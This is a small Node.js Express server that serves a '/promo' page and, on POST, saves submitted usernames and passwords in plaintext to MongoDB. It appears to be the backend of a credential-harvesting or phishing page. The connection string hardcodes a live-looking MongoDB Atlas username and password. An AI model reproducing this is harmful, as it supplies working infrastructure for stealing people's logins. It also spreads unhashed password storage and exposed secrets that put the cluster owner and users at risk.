const fs = require('fs');
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');

const app = express();

app.use(express.json())

mongoose.connect('mongodb+srv://witooz123:Ds1wfuGUxaqGvdSW@datacluster.s71xtyr.mongodb.net/?retryWrites=true&w=majority', { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => {
        console.log('Conexión exitosa a MongoDB');
    })
    .catch((error) => {
        console.error('Error de conexión a MongoDB:', error);
    });

// Definir un modelo de datos (ejemplo)
const Message = mongoose.model('Message', {
  user: String,
  passwd: String,
  timestamp: { type: Date, default: Date.now }
});

app.get('/promo', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/promo', async (req, res) => {
    try {
        const { user, passwd } = req.body; // Extraer user y passwd del cuerpo de la solicitud
    
        // Guardar el mensaje en MongoDB
        const message = new Message({ user, passwd }); // Construir el objeto Message directamente con user y passwd
        await message.save();
    
        res.status(201).json(message);
    } catch (error) {
        console.error(error);
        res.status(500).send('Error al guardar el mensaje en la base de datos.');
    }
});


const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Servidor activo en -> http://localhost:${PORT}/`);
});
